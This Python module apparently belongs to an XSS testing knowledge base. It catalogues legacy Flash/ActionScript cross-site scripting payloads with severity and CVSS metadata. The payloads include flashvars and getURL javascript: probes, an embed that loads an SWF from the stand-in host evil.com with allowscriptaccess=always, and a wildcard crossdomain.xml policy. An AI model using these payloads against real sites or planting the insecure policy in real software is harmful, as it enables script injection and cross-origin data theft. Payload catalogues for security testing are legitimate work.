#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26

Flash/ActionScript Legacy XSS Payloads
For legacy systems still using Flash
"""

from ..models import PayloadEntry


FLASH_LEGACY_DATABASE = {
    # ===== FLASHVARS XSS =====
    "flash_vars_001": PayloadEntry(
        payload='<embed src=x.swf flashvars="callback=alert(1)">',
        contexts=["html_content"],
        tags=["flash", "legacy", "flashvars"],
        severity="high",
        cvss_score=7.5,
        description="Flash flashvars XSS",
        reliability="low",
    ),
    "flash_vars_002": PayloadEntry(
        payload='<object data=x.swf><param name=flashvars value="callback=javascript:alert(1)"></object>',
        contexts=["html_content"],
        tags=["flash", "legacy", "flashvars"],
        severity="high",
        cvss_score=7.5,
        description="Flash object flashvars",
        reliability="low",
    ),
    # ===== ALLOWSCRIPTACCESS =====
    "flash_asa_001": PayloadEntry(
        payload="<embed src=//evil.com/x.swf allowscriptaccess=always>",
        contexts=["html_content"],
        tags=["flash", "legacy", "allowscriptaccess"],
        severity="critical",
        cvss_score=9.0,
        description="Flash allowScriptAccess always",
        reliability="low",
    ),
    # ===== GETURL/NAVIGATETOURL =====
    "flash_geturl_001": PayloadEntry(
        payload='getURL("javascript:alert(1)")',
        contexts=["javascript"],
        tags=["flash", "legacy", "actionscript"],
        severity="high",
        cvss_score=7.5,
        description="ActionScript getURL",
        reliability="low",
    ),
    "flash_navigate_001": PayloadEntry(
        payload='navigateToURL(new URLRequest("javascript:alert(1)"))',
        contexts=["javascript"],
        tags=["flash", "legacy", "actionscript3"],
        severity="high",
        cvss_score=7.5,
        description="ActionScript 3 navigateToURL",
        reliability="low",
    ),
    # ===== EXTERNALINTERFACE =====
    "flash_ei_001": PayloadEntry(
        payload='ExternalInterface.call("alert", 1)',
        contexts=["javascript"],
        tags=["flash", "legacy", "externalinterface"],
        severity="high",
        cvss_score=7.5,
        description="ExternalInterface.call XSS",
        reliability="low",
    ),
    # ===== CROSSDOMAIN =====
    "flash_crossdomain_001": PayloadEntry(
        payload='<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>',
        contexts=["xml"],
        tags=["flash", "legacy", "crossdomain"],
        severity="high",
        cvss_score=7.5,
        description="Insecure crossdomain.xml",
        reliability="low",
    ),
}

FLASH_LEGACY_TOTAL = len(FLASH_LEGACY_DATABASE)
